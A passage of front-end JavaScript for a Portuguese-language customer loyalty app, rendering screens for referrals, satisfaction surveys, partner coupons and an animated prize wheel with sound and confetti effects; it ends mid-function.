                    <p class="text-xl font-bold text-slate-800 mt-1">${data.total_indicacoes}</p>
                </div>
                <div class="bg-white border border-slate-200 rounded-2xl p-3 text-center">
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Convertidas</p>
                    <p class="text-xl font-bold text-emerald-600 mt-1">${data.total_convertidas}</p>
                </div>
                <div class="bg-white border border-slate-200 rounded-2xl p-3 text-center">
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Pts ganhos</p>
                    <p class="text-xl font-bold text-amber-600 mt-1">${fmtNum(data.total_pontos_ganhos)}</p>
                </div>
            </div>
        </div>

        <div class="px-4 mt-4">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Indicar manualmente</h3>
            <form id="form-indicar" class="bg-white border border-slate-200 rounded-2xl p-4 space-y-3">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nome do amigo</label>
                    <div class="relative">
                        <i class="ri-user-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="nome_indicado" required placeholder="Como ele é chamado"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone</label>
                    <div class="relative">
                        <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="telefone_indicado" required placeholder="(11) 99999-9999"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
                <button class="w-full py-3 text-white rounded-xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition" style="background:linear-gradient(135deg,${cor},${corSec})">
                    <i class="ri-user-add-line"></i> Registrar indicação
                </button>
            </form>
        </div>

        <div class="px-4 mt-5 pb-6">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Histórico</h3>
            ${data.indicacoes.length === 0 ? `
                <div class="bg-white border border-slate-200 rounded-2xl p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-2">
                        <i class="ri-share-line text-2xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhuma indicação ainda</p>
                    <p class="text-xs text-slate-400 mt-1">Compartilhe seu código pra começar</p>
                </div>
            ` : `
            <div class="bg-white border border-slate-200 rounded-2xl overflow-hidden divide-y divide-slate-100">
                ${data.indicacoes.map(i => `
                    <div class="p-4 flex items-center gap-3">
                        <div class="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center font-semibold text-slate-600 flex-shrink-0">
                            ${esc(String(i.nome_indicado || '').charAt(0).toUpperCase())}
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="font-semibold text-slate-800 truncate">${esc(i.nome_indicado)}</p>
                            <p class="text-xs text-slate-500">${esc(i.telefone)} &middot; ${esc(i.data)}</p>
                        </div>
                        <span class="text-[10px] font-semibold px-2 py-1 rounded-full ${
                            i.status === 'convertido' ? 'bg-emerald-50 text-emerald-700' :
                            i.status === 'cadastrado' ? 'bg-blue-50 text-blue-700' :
                            i.status === 'expirado' ? 'bg-slate-100 text-slate-600' :
                            'bg-amber-50 text-amber-700'
                        }">${i.status}</span>
                    </div>
                `).join('')}
            </div>`}
        </div>
    </div>`;

    $('#form-indicar').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        try {
            await api('/indicacoes', { method: 'POST', body: JSON.stringify(fd) });
            toast('Indicação registrada!', 'success');
            telaIndicacoes();
        } catch (e) { toast(e.message, 'error'); }
    });
}

window.copiarLink = (link) => {
    navigator.clipboard.writeText(link).then(() => toast('Link copiado!', 'success'));
};

window.compartilharIndicacao = async (link, nomeEmpresa) => {
    const texto = `Conheci o programa de fidelidade da ${nomeEmpresa} e queria te indicar! Cadastre-se pelo meu link:`;
    if (navigator.share) {
        try { await navigator.share({ title: nomeEmpresa, text: texto, url: link }); } catch {}
    } else {
        navigator.clipboard.writeText(`${texto} ${link}`).then(() => toast('Mensagem copiada!', 'success'));
    }
};

// Tela 10: Pesquisa de satisfação
async function telaPesquisa() {
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    const data = await api('/pesquisas/minha-geral');
    const existente = data.pesquisa;
    const notaInicial = existente?.nota || 0;
    const comentarioInicial = existente?.comentario || '';

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">${existente ? 'Sua avaliação' : 'Avalie nosso atendimento'}</h1>
            <p class="text-white/80 text-sm mt-1">${existente ? 'Você pode editar ou excluir abaixo' : 'Sua opinião é muito importante'}</p>
        </div>

        <form id="form-pesquisa" class="px-4 -mt-6 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-6 space-y-5">
                <div>
                    <p class="text-center text-sm text-slate-700 mb-3">Como você avalia sua experiência?</p>
                    <div class="flex justify-center gap-2" id="estrelas">
                        ${[1,2,3,4,5].map(n => `
                            <button type="button" data-nota="${n}" class="estrela text-4xl ${n <= notaInicial ? 'text-amber-400' : 'text-slate-300'} hover:text-amber-400 transition">
                                <i class="ri-star-fill"></i>
                            </button>
                        `).join('')}
                    </div>
                    <input type="hidden" name="nota" id="nota-input" value="${notaInicial}" required>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Comentário (opcional)</label>
                    <textarea name="comentario" rows="5" maxlength="1000" placeholder="Conte como foi sua experiência..."
                              class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">${comentarioInicial.replace(/</g, '&lt;')}</textarea>
                </div>

                ${existente ? `
                <p class="text-xs text-slate-500 text-center">
                    <i class="ri-information-line"></i> Avaliação enviada em ${new Date(existente.created_at).toLocaleDateString('pt-BR')}
                </p>` : ''}
            </div>

            <button type="submit" class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-${existente ? 'save' : 'send-plane'}-line"></i> ${existente ? 'Salvar alterações' : 'Enviar avaliação'}
            </button>

            ${existente ? `
            <button type="button" onclick="excluirAvaliacao(${existente.id})"
                    class="w-full mt-2 py-3 text-rose-600 font-medium rounded-2xl border-2 border-rose-200 bg-white hover:bg-rose-50 transition flex items-center justify-center gap-2">
                <i class="ri-delete-bin-line"></i> Excluir avaliação
            </button>` : ''}

            <button type="button" onclick="showScreen('perfil')" class="w-full mt-2 py-3 text-slate-600 font-medium rounded-2xl hover:bg-slate-100 transition">
                Cancelar
            </button>
        </form>
    </div>`;

    document.querySelectorAll('.estrela').forEach((el) => {
        el.addEventListener('click', () => {
            const n = +el.dataset.nota;
            $('#nota-input').value = n;
            document.querySelectorAll('.estrela').forEach((s, i) => {
                s.classList.toggle('text-amber-400', i < n);
                s.classList.toggle('text-slate-300', i >= n);
            });
        });
    });

    $('#form-pesquisa').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        if (!fd.nota || fd.nota === '0') return toast('Selecione uma nota', 'error');
        try {
            if (existente) {
                await api('/pesquisas/'+existente.id, { method: 'PUT', body: JSON.stringify(fd) });
                toast('Avaliação atualizada!', 'success');
            } else {
                await api('/pesquisas', { method: 'POST', body: JSON.stringify(fd) });
                toast('Obrigado pela avaliação!', 'success');
            }
            setTimeout(() => showScreen('home'), 800);
        } catch (e) { toast(e.message, 'error'); }
    });
}

window.excluirAvaliacao = async (id) => {
    const ok = await confirmar({
        titulo: 'Excluir avaliação',
        mensagem: 'Tem certeza? Você poderá criar uma nova depois.',
        ok: 'Excluir',
        tipo: 'danger',
        icone: 'ri-delete-bin-line',
    });
    if (!ok) return;
    try {
        await api('/pesquisas/'+id, { method: 'DELETE' });
        toast('Avaliação removida', 'success');
        setTimeout(() => showScreen('perfil'), 600);
    } catch (e) { toast(e.message, 'error'); }
};

// Tela 11: Parceiros e benefícios
async function telaParceiros() {
    const data = await api('/parceiros');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <div class="flex justify-between items-start gap-3">
                <div class="flex-1 min-w-0">
                    <h1 class="text-2xl font-bold">Parceiros</h1>
                    <p class="text-white/80 text-sm mt-1">Cupons exclusivos de empresas parceiras</p>
                </div>
                <button onclick="showScreen('meusCupons')" class="bg-white/20 backdrop-blur hover:bg-white/30 px-3 py-2 rounded-full text-xs font-medium flex items-center gap-1 transition flex-shrink-0">
                    <i class="ri-coupon-3-line"></i> Meus cupons
                </button>
            </div>
        </div>

        <div class="px-4 -mt-6 pb-6 space-y-4">
            ${data.parceiros.length === 0 ? `
                <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-shake-hands-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhum parceiro com benefícios ativos</p>
                </div>
            ` : ''}
            ${data.parceiros.map(p => `
                <div class="bg-white border border-slate-200 rounded-2xl overflow-hidden">
                    <div class="p-4 flex items-start gap-3 bg-slate-50 border-b border-slate-100">
                        ${p.logo
                            ? `<img src="${escAttr(p.logo)}" class="w-12 h-12 rounded-xl object-cover flex-shrink-0">`
                            : `<div class="w-12 h-12 rounded-xl flex items-center justify-center text-white text-xl flex-shrink-0" style="background:linear-gradient(135deg,${escAttr(cor)},${escAttr(corSec)})"><i class="ri-store-2-line"></i></div>`}
                        <div class="flex-1 min-w-0">
                            <p class="font-semibold text-slate-800 truncate">${esc(p.nome)}</p>
                            ${p.categoria ? `<p class="text-xs text-slate-500">${esc(p.categoria)}</p>` : ''}
                            ${p.endereco ? `<p class="text-xs text-slate-500 mt-0.5 flex items-start gap-1"><i class="ri-map-pin-line mt-0.5 flex-shrink-0"></i> <span class="truncate">${esc(p.endereco)}</span></p>` : ''}
                        </div>
                    </div>
                    <div class="p-4 space-y-2.5">
                        ${p.beneficios.map(b => `
                            <div class="rounded-xl border border-slate-200 p-3 ${!b.pode_resgatar ? 'opacity-60 bg-slate-50' : ''}">
                                <div class="flex justify-between items-start gap-3">
                                    <div class="flex-1 min-w-0">
                                        <div class="flex items-center gap-2 flex-wrap">
                                            <p class="font-semibold text-sm text-slate-800">${esc(b.nome)}</p>
                                            ${b.destaque ? '<span class="text-[10px] font-semibold bg-amber-100 text-amber-700 px-2 py-0.5 rounded-full"><i class="ri-star-fill"></i> Destaque</span>' : ''}
                                        </div>
                                        <p class="text-emerald-700 font-bold text-xs mt-1 flex items-center gap-1">
                                            <i class="ri-percent-line"></i> ${esc(b.tipo_descricao)}
                                        </p>
                                        ${b.descricao ? `<p class="text-xs text-slate-600 mt-1.5">${esc(b.descricao)}</p>` : ''}
                                        ${b.condicoes ? `<p class="text-[11px] text-slate-500 mt-1.5 flex items-start gap-1"><i class="ri-information-line mt-0.5 flex-shrink-0"></i> <span>${esc(b.condicoes)}</span></p>` : ''}
                                        ${b.valido_ate ? `<p class="text-[11px] text-slate-500 mt-1"><i class="ri-time-line"></i> Válido até ${esc(b.valido_ate)}</p>` : ''}
                                    </div>
                                    <button onclick="ativarCupom(${b.id}, '${b.nome.replace(/'/g, "\\'")}')"
                                            ${!b.pode_resgatar ? 'disabled' : ''}
                                            class="text-xs px-3 py-2 rounded-xl text-white font-semibold disabled:bg-slate-300 disabled:text-slate-500 shrink-0 hover:shadow-md transition"
                                            style="${b.pode_resgatar ? `background:linear-gradient(135deg,${cor},${corSec})` : ''}">
                                        ${b.pode_resgatar ? 'Ativar' : 'Indisponível'}
                                    </button>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `).join('')}
        </div>
    </div>`;
}

window.ativarCupom = async (beneficioId, nome) => {
    const ok = await confirmar({
        titulo: 'Ativar cupom',
        mensagem: `Ativar "${nome}"?\nVocê receberá um código pra apresentar no parceiro.`,
        ok: 'Ativar',
        icone: 'ri-coupon-line',
    });
    if (!ok) return;
    try {
        const res = await api('/parceiros/cupons', { method: 'POST', body: JSON.stringify({ beneficio_id: beneficioId }) });
        toast(`Cupom ativado: ${res.cupom.codigo}`, 'success');
        setTimeout(() => showScreen('meusCupons'), 800);
    } catch (e) { toast(e.message, 'error'); }
};

// Tela 12: Meus cupons (parceiros)
async function telaMeusCupons() {
    const data = await api('/parceiros/meus-cupons');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    // Volta para onde veio (perfil, parceiros, home) — default: parceiros
    const voltarPara = ['perfil','parceiros','home'].includes(telaAnterior) ? telaAnterior : 'parceiros';

    const statusInfo = (s) => ({
        disponivel: { label: 'Disponível', cls: 'bg-emerald-100 text-emerald-700', icon: 'ri-check-line' },
        usado:      { label: 'Usado',      cls: 'bg-slate-200 text-slate-600',     icon: 'ri-checkbox-circle-line' },
        expirado:   { label: 'Expirado',   cls: 'bg-rose-100 text-rose-700',       icon: 'ri-close-circle-line' },
    }[s] || { label: s, cls: 'bg-slate-200 text-slate-600', icon: 'ri-question-line' });

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('${voltarPara}')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Meus cupons</h1>
            <p class="text-white/80 text-sm mt-1">${data.cupons.length} ${data.cupons.length === 1 ? 'cupom' : 'cupons'}</p>
        </div>

        <div class="px-4 -mt-6 pb-6 space-y-3">
            ${data.cupons.length === 0 ? `
                <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-coupon-3-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhum cupom ativo</p>
                    <p class="text-xs text-slate-400 mt-1">Ative cupons na tela Parceiros</p>
                    <button onclick="showScreen('parceiros')"
                            class="mt-4 px-4 py-2 text-white rounded-xl text-sm font-semibold"
                            style="background:linear-gradient(135deg,${cor},${corSec})">
                        Ver parceiros
                    </button>
                </div>
            ` : ''}
            ${data.cupons.map(c => {
                const info = statusInfo(c.status);
                return `
                <div class="bg-white border border-slate-200 rounded-2xl overflow-hidden">
                    <div class="p-4 flex items-start gap-3">
                        ${c.parceiro_logo
                            ? `<img src="${c.parceiro_logo}" class="w-11 h-11 rounded-xl object-cover flex-shrink-0">`
                            : `<div class="w-11 h-11 rounded-xl bg-slate-100 flex items-center justify-center text-slate-500 flex-shrink-0"><i class="ri-store-2-line text-xl"></i></div>`}
                        <div class="flex-1 min-w-0">
                            <p class="font-semibold text-slate-800 truncate">${c.beneficio}</p>
                            <p class="text-xs text-slate-500">${c.parceiro}</p>
                        </div>
                        <span class="text-[11px] font-semibold px-2 py-0.5 rounded-full flex items-center gap-1 ${info.cls} flex-shrink-0">
                            <i class="${info.icon}"></i> ${info.label}
                        </span>
                    </div>
                    ${c.utilizavel ? `
                        <div class="mx-4 mb-4 p-4 bg-amber-50 border-2 border-dashed border-amber-300 rounded-xl text-center">
                            <p class="text-[11px] text-amber-700 mb-1.5 uppercase tracking-wider font-semibold">Apresente no parceiro</p>
                            <p class="text-3xl font-bold font-mono tracking-wider text-amber-800">${c.codigo}</p>
                            <p class="text-[11px] text-amber-600 mt-2"><i class="ri-time-line"></i> Válido até ${c.valido_ate}</p>
                        </div>
                    ` : ''}
                    ${c.usado_em ? `
                        <div class="mx-4 mb-4 px-3 py-2 bg-slate-50 rounded-lg text-xs text-slate-500 text-center">
                            <i class="ri-checkbox-circle-line"></i> Usado em ${c.usado_em}
                        </div>
                    ` : ''}
                </div>
            `}).join('')}
        </div>
    </div>`;
}

// ============ ROLETA DA SORTE ============

const ROLETA = {
    audioCtx: null,
    girando: false,
};

function roletaAudio() {
    if (!ROLETA.audioCtx) {
        try { ROLETA.audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
        catch (e) { return null; }
    }
    return ROLETA.audioCtx;
}

function roletaTic(freq = 1200) {
    const ctx = roletaAudio(); if (!ctx) return;
    const o = ctx.createOscillator();
    const g = ctx.createGain();
    o.type = 'square';
    o.frequency.value = freq;
    g.gain.setValueAtTime(0.06, ctx.currentTime);
    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.04);
    o.connect(g); g.connect(ctx.destination);
    o.start(); o.stop(ctx.currentTime + 0.05);
}

function roletaWin() {
    const ctx = roletaAudio(); if (!ctx) return;
    const notas = [523.25, 659.25, 783.99, 1046.50]; // C5 E5 G5 C6
    notas.forEach((f, i) => {
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.type = 'triangle';
        o.frequency.value = f;
        g.gain.setValueAtTime(0.0001, ctx.currentTime + i * 0.12);
        g.gain.linearRampToValueAtTime(0.15, ctx.currentTime + i * 0.12 + 0.02);
        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + i * 0.12 + 0.4);
        o.connect(g); g.connect(ctx.destination);
        o.start(ctx.currentTime + i * 0.12);
        o.stop(ctx.currentTime + i * 0.12 + 0.45);
    });
}

function roletaConsolacao() {
    const ctx = roletaAudio(); if (!ctx) return;
    [880, 740].forEach((f, i) => {
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.type = 'sine';
        o.frequency.value = f;
        g.gain.setValueAtTime(0.001, ctx.currentTime + i * 0.16);
        g.gain.linearRampToValueAtTime(0.1, ctx.currentTime + i * 0.16 + 0.02);
        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + i * 0.16 + 0.4);
        o.connect(g); g.connect(ctx.destination);
        o.start(ctx.currentTime + i * 0.16);
        o.stop(ctx.currentTime + i * 0.16 + 0.45);
    });
}

function roletaVibrar(padrao) {
    if ('vibrate' in navigator) {
        try { navigator.vibrate(padrao); } catch (e) {}
    }
}

function roletaDesenhar(canvas, premios, anguloRad) {
    const ctx = canvas.getContext('2d');
    const size = canvas.width;
    const cx = size / 2, cy = size / 2;
    const raio = size / 2 - 6;
    const n = premios.length;
    const setor = (Math.PI * 2) / n;

    ctx.clearRect(0, 0, size, size);

    for (let i = 0; i < n; i++) {
        const a0 = anguloRad + i * setor - Math.PI / 2;
        const a1 = a0 + setor;
        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, raio, a0, a1);
        ctx.closePath();
        ctx.fillStyle = premios[i].cor;
        ctx.fill();
        ctx.lineWidth = 2;
        ctx.strokeStyle = 'rgba(255,255,255,0.4)';
        ctx.stroke();

        ctx.save();
        ctx.translate(cx, cy);
        ctx.rotate(a0 + setor / 2);
        ctx.textAlign = 'right';
        ctx.fillStyle = '#fff';
        ctx.font = 'bold 13px sans-serif';
        ctx.shadowColor = 'rgba(0,0,0,0.3)';
        ctx.shadowBlur = 3;
        const txt = premios[i].label.length > 14 ? premios[i].label.slice(0, 13) + '…' : premios[i].label;
        ctx.fillText(txt, raio - 12, 5);
        ctx.restore();
    }

    ctx.beginPath();
    ctx.arc(cx, cy, 22, 0, Math.PI * 2);
    ctx.fillStyle = '#fff';
    ctx.fill();
    ctx.lineWidth = 4;
    ctx.strokeStyle = 'rgba(0,0,0,0.15)';
    ctx.stroke();
}

// Desaceleração suave sem overshoot — a roleta vai diminuindo até parar
// exatamente no prêmio escolhido. Quartic é mais "pesado" no final que cubic,
// dá uma sensação de freio mais natural sem o efeito mola.
function easeOutQuart(t) { return 1 - Math.pow(1 - t, 4); }

async function roletaAnimar(canvas, premios, indicePremio, duracaoMs) {
    const n = premios.length;
    const setor = (Math.PI * 2) / n;
    // voltas precisa ser INTEIRO — qualquer fração desalinha o ângulo final
    // do centro do setor sorteado e faz o ponteiro cair fora do prêmio.
    const voltas = 5 + Math.floor(Math.random() * 3); // 5, 6 ou 7
    const anguloFinal = voltas * Math.PI * 2 + (Math.PI * 2 - (indicePremio * setor + setor / 2));

    let inicio = null;
    let ultimoSetor = -1;
    return new Promise((resolve) => {
        function tick(ts) {
            if (!inicio) inicio = ts;
            const t = Math.min(1, (ts - inicio) / duracaoMs);
            const e = easeOutQuart(t);
            const ang = anguloFinal * e;
            roletaDesenhar(canvas, premios, ang);

            const setorAtual = Math.floor((ang % (Math.PI * 2)) / setor);
            if (setorAtual !== ultimoSetor) {
                ultimoSetor = setorAtual;
                roletaTic(900 + (1 - t) * 600);
                if (t > 0.6) roletaVibrar(8);
            }

            if (t < 1) requestAnimationFrame(tick);
            else resolve();
        }
        requestAnimationFrame(tick);
    });
}

function roletaConfete() {
    if (typeof confetti !== 'function') return;
    const dur = 2500, fim = Date.now() + dur;
    (function frame() {
        confetti({ particleCount: 4, angle: 60, spread: 65, origin: { x: 0 }, colors: ['#f59e0b','#ef4444','#a855f7','#22c55e','#3b82f6'] });
        confetti({ particleCount: 4, angle: 120, spread: 65, origin: { x: 1 }, colors: ['#f59e0b','#ef4444','#a855f7','#22c55e','#3b82f6'] });
        if (Date.now() < fim) requestAnimationFrame(frame);
    })();
}

function roletaModalResultado(resultado, premio) {
    const ehGanho = resultado.tipo_resultado !== 'consolacao';
    const cor = ehGanho ? 'linear-gradient(135deg,#f59e0b,#ef4444 60%,#a855f7)' : 'linear-gradient(135deg,#6366f1,#8b5cf6)';
    const icone = resultado.tipo_resultado === 'sorteio_bilhete' ? '🎟️' : (ehGanho ? '🎉' : '💛');
    const titulo = ehGanho
        ? (resultado.tipo_resultado === 'nova_chance' ? 'Nova chance!'
           : resultado.tipo_resultado === 'sorteio_bilhete' ? 'Bilhete garantido!'
           : 'Você ganhou!')
        : 'Quase lá!';

    const wrap = document.createElement('div');
    wrap.className = 'modal-overlay fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm';
    wrap.innerHTML = `
        <div class="modal-sheet bg-white w-full sm:max-w-sm rounded-t-3xl sm:rounded-3xl shadow-2xl overflow-hidden">
            <div class="p-8 text-center text-white" style="background:${cor}">
                <div class="text-6xl mb-3 animate-bounce">${icone}</div>
                <h2 class="text-2xl font-bold">${titulo}</h2>
                <p class="text-white/95 mt-2 text-sm">${resultado.mensagem}</p>
                ${resultado.expira_em ? `
                    <p class="text-white/80 text-xs mt-3 inline-flex items-center gap-1 bg-white/15 px-3 py-1 rounded-full">
                        <i class="ri-time-line"></i> Apresente o código até ${resultado.expira_em}
                    </p>` : ''}
                ${resultado.sorteio_nome ? `
                    <p class="text-white/80 text-xs mt-3 inline-flex items-center gap-1 bg-white/15 px-3 py-1 rounded-full">
                        <i class="ri-calendar-event-line"></i> Sorteio "${resultado.sorteio_nome}" — ${resultado.sorteio_data}
                    </p>
                    ${resultado.bilhete_numero ? `
                        <p class="text-white mt-3 inline-flex items-center gap-2 bg-white/25 backdrop-blur px-4 py-2 rounded-full font-bold">
                            <i class="ri-ticket-2-fill"></i> Seu bilhete: ${resultado.bilhete_numero}
                        </p>` : ''}
                ` : ''}
            </div>
            <div class="p-5 flex flex-col gap-2" style="padding-bottom: max(1.25rem, env(safe-area-inset-bottom));">
                ${resultado.resgate_id ? `
                    <button data-acao="resgates" class="w-full py-3 rounded-xl text-white font-semibold text-sm shadow"
                            style="background:var(--cor-primaria,#6366f1)">
                        Ver meu prêmio <i class="ri-arrow-right-line"></i>
                    </button>` : ''}
                ${resultado.tipo_resultado === 'sorteio_bilhete' ? `
                    <button data-acao="sorteios" class="w-full py-3 rounded-xl text-white font-semibold text-sm shadow"
                            style="background:var(--cor-primaria,#6366f1)">
                        Ver meus bilhetes <i class="ri-arrow-right-line"></i>
                    </button>` : ''}
                <button data-acao="fechar" class="w-full py-3 rounded-xl bg-slate-100 text-slate-700 font-semibold text-sm">
                    ${resultado.tipo_resultado === 'nova_chance' ? 'Girar de novo' : 'Continuar'}
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(wrap);
    return new Promise((resolve) => {
        wrap.addEventListener('click', (ev) => {
            const acao = ev.target.closest('[data-acao]')?.dataset.acao;
            if (!acao && ev.target !== wrap) return;
            wrap.remove();
            resolve(acao || 'fechar');
        });
    });
}

async function telaRoleta() {
    const status = await api('/cliente/roleta/status');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    if (!status.ativa) {
        screenContainer.innerHTML = `
        <div class="fade-in flex-1 flex flex-col items-center justify-center bg-slate-50 p-8 text-center">
            <div class="text-6xl mb-3">🎰</div>
            <h2 class="text-xl font-bold text-slate-700">Roleta indisponível</h2>
            <p class="text-sm text-slate-500 mt-1">Esta loja ainda não ativou a roleta.</p>
            <button onclick="showScreen('home')" class="mt-6 px-6 py-2 rounded-xl bg-slate-200 text-slate-700 text-sm font-semibold">Voltar</button>
        </div>`;
        return;
    }

    const premios = status.premios || [];
    const semGiros = !status.pode_girar;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50 overflow-y-auto">
        <div class="px-5 pt-6 pb-12 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <div class="flex items-center justify-between">
                <button onclick="showScreen('home')" class="w-10 h-10 rounded-full bg-white/20 backdrop-blur flex items-center justify-center">
                    <i class="ri-arrow-left-line text-xl"></i>
                </button>
                <h1 class="text-lg font-bold">${status.nome}</h1>
                <div class="w-10"></div>
            </div>
            <div class="mt-4 bg-white/15 backdrop-blur rounded-2xl border border-white/20 p-3 flex items-center justify-around">
                <div class="text-center">
                    <p class="text-[10px] text-white/70 uppercase">Giros disponíveis</p>
                    <p class="text-2xl font-bold">${status.giros_disponiveis}</p>
                </div>
                <div class="text-center">
                    <p class="text-[10px] text-white/70 uppercase">Hoje</p>
                    <p class="text-2xl font-bold">${status.giros_usados_hoje}/${status.limite_giros_dia}</p>
                </div>
            </div>
        </div>

        <div class="-mt-8 mx-auto relative">
            <div class="relative" style="width:320px;height:320px;">
                <canvas id="roleta-canvas" width="320" height="320" class="rounded-full shadow-2xl bg-white"></canvas>
                <div class="absolute left-1/2 -translate-x-1/2 -top-2 w-0 h-0" style="border-left:14px solid transparent;border-right:14px solid transparent;border-top:24px solid #1e293b;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3))"></div>
            </div>
        </div>

        <div class="p-5 mt-4">
            <button id="btn-girar" ${semGiros ? 'disabled' : ''}
                    class="w-full py-4 rounded-2xl text-white font-bold text-lg shadow-lg transition active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    style="background:linear-gradient(135deg,#f59e0b,#ef4444 50%,#a855f7);">
                ${semGiros ? `<span>${status.giros_disponiveis === 0 ? 'Sem giros disponíveis' : 'Limite diário atingido'}</span>` : `
                    <svg viewBox="0 0 24 24" class="w-6 h-6 text-white">
                        <path d="M12 0 L10 3.5 L14 3.5 Z" fill="currentColor"/>
                        <g transform="translate(12, 13)">
                            <path d="M0,0 L0,-9 A9,9 0 0,1 6.36,-6.36 Z" fill="currentColor"/>
                            <path d="M0,0 L6.36,-6.36 A9,9 0 0,1 9,0 Z" fill="currentColor" opacity="0.45"/>
                            <path d="M0,0 L9,0 A9,9 0 0,1 6.36,6.36 Z" fill="currentColor"/>
                            <path d="M0,0 L6.36,6.36 A9,9 0 0,1 0,9 Z" fill="currentColor" opacity="0.45"/>
                            <path d="M0,0 L0,9 A9,9 0 0,1 -6.36,6.36 Z" fill="currentColor"/>
                            <path d="M0,0 L-6.36,6.36 A9,9 0 0,1 -9,0 Z" fill="currentColor" opacity="0.45"/>
                            <path d="M0,0 L-9,0 A9,9 0 0,1 -6.36,-6.36 Z" fill="currentColor"/>
                            <path d="M0,0 L-6.36,-6.36 A9,9 0 0,1 0,-9 Z" fill="currentColor" opacity="0.45"/>
                            <circle r="1.3" fill="white"/>
                        </g>
                    </svg>
                    <span>GIRAR AGORA</span>`}
            </button>
            ${semGiros && status.giros_disponiveis === 0 ? `
                <p class="text-xs text-slate-500 text-center mt-3">
                    Faça compras pra ganhar mais giros!
                </p>` : ''}
            <div class="mt-5">
                <p class="text-xs text-slate-400 uppercase tracking-wider font-semibold mb-2">Prêmios possíveis</p>
                <div class="space-y-1">
                    ${premios.map(p => `
                        <div class="flex items-center gap-2 text-sm">
                            <span class="inline-block w-3 h-3 rounded-full" style="background:${p.cor}"></span>
                            <span class="text-slate-700">${p.label}</span>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    </div>`;

    const canvas = document.getElementById('roleta-canvas');
    roletaDesenhar(canvas, premios, 0);

    const btn = document.getElementById('btn-girar');
    if (btn && !btn.disabled) {
        btn.onclick = async () => {
            if (ROLETA.girando) return;
            ROLETA.girando = true;
            btn.disabled = true;
            btn.classList.add('opacity-50');
            try {
                roletaTic(1500); roletaVibrar(20);
                const resp = await api('/cliente/roleta/girar', { method: 'POST' });

